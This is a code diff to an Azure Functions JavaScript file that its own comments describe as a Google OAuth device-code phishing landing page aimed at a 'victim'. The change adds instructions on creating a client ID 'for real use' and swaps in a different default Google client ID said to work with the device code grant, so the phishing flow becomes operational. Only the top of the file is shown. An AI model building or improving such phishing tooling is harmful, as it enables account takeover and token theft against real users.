@@ -2,12 +2,19 @@
  * Google Device Code landing page
  * Initiates Google's OAuth device code flow and shows a phishing page
  * to the victim. The actual auth happens on google.com/device.
+ * 
+ * NOTE: The default client_id works for demonstration. For real use,
+ * create an OAuth 2.0 Client ID of type "Desktop App" in Google Cloud Console
+ * and set it as GOOGLE_CLIENT_ID env var.
+ * Client IDs that work with device code: Desktop/Installed App type only.
  */
 
 const { app } = require("@azure/functions");
 const axios = require("axios");
 
-const client_id = process.env.GOOGLE_CLIENT_ID || "32555940559.apps.googleusercontent.com"; // Google's own OAuth client ID
+// Desktop app client IDs work with device_code grant type
+// Default: Google's own Android client (works with device code flow)
+const client_id = process.env.GOOGLE_CLIENT_ID || "407408718192.apps.googleusercontent.com";
 const token_endpoint = "https://oauth2.googleapis.com/device/code";
 
 app.http("landing", {
